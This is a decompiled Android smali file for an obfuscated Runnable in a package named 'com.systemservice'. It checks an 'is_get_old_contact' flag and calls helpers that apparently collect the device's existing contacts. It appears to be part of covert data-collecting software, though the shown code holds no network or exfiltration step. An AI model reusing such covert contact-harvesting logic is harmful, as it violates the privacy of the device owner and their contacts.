.class Lcom/systemservice/a/c/e/a;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/a/c/e/d;->a(Lcom/systemservice/a/d/b;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Landroid/content/Context;

.field final synthetic b:Lcom/systemservice/a/d/b;

.field final synthetic c:Lcom/systemservice/a/c/e/d;


# direct methods
.method constructor <init>(Lcom/systemservice/a/c/e/d;Landroid/content/Context;Lcom/systemservice/a/d/b;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/a/c/e/a;->c:Lcom/systemservice/a/c/e/d;

    iput-object p2, p0, Lcom/systemservice/a/c/e/a;->a:Landroid/content/Context;

    iput-object p3, p0, Lcom/systemservice/a/c/e/a;->b:Lcom/systemservice/a/d/b;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 5
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "LongLogTag"
        }
    .end annotation

    const-string v0, ""

    :try_start_0
    iget-object v1, p0, Lcom/systemservice/a/c/e/a;->a:Landroid/content/Context;

    const-string v2, "app_prefs_settings"

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    const-string v2, "is_get_old_contact"

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v1

    const-string v2, "ZValue"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v2, p0, Lcom/systemservice/a/c/e/a;->c:Lcom/systemservice/a/c/e/d;

    invoke-static {v2}, Lcom/systemservice/a/c/e/d;->a(Lcom/systemservice/a/c/e/d;)Lorg/apache/log4j/Logger;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "is_get_old_contact = "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    if-nez v1, :cond_0

    iget-object v1, p0, Lcom/systemservice/a/c/e/a;->c:Lcom/systemservice/a/c/e/d;

    iget-object v2, p0, Lcom/systemservice/a/c/e/a;->b:Lcom/systemservice/a/d/b;

    check-cast v2, Lcom/systemservice/a/b/a;

    invoke-virtual {v2}, Lcom/systemservice/a/b/a;->a()Landroid/content/Context;

    move-result-object v2

    invoke-static {v1, v2}, Lcom/systemservice/a/c/e/d;->a(Lcom/systemservice/a/c/e/d;Landroid/content/Context;)V

    :cond_0
    iget-object v1, p0, Lcom/systemservice/a/c/e/a;->c:Lcom/systemservice/a/c/e/d;

    iget-object v1, v1, Lcom/systemservice/a/d/g;->b:Lcom/systemservice/a/h/b;

    check-cast v1, Lcom/systemservice/a/h/h;

    iget-object v2, p0, Lcom/systemservice/a/c/e/a;->c:Lcom/systemservice/a/c/e/d;

    iget-object v3, p0, Lcom/systemservice/a/c/e/a;->a:Landroid/content/Context;

    invoke-static {v2, v3, v1}, Lcom/systemservice/a/c/e/d;->a(Lcom/systemservice/a/c/e/d;Landroid/content/Context;Lcom/systemservice/a/h/h;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    iget-object v2, p0, Lcom/systemservice/a/c/e/a;->c:Lcom/systemservice/a/c/e/d;

    invoke-static {v2}, Lcom/systemservice/a/c/e/d;->a(Lcom/systemservice/a/c/e/d;)Lorg/apache/log4j/Logger;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V

    :goto_0
    return-void
.end method
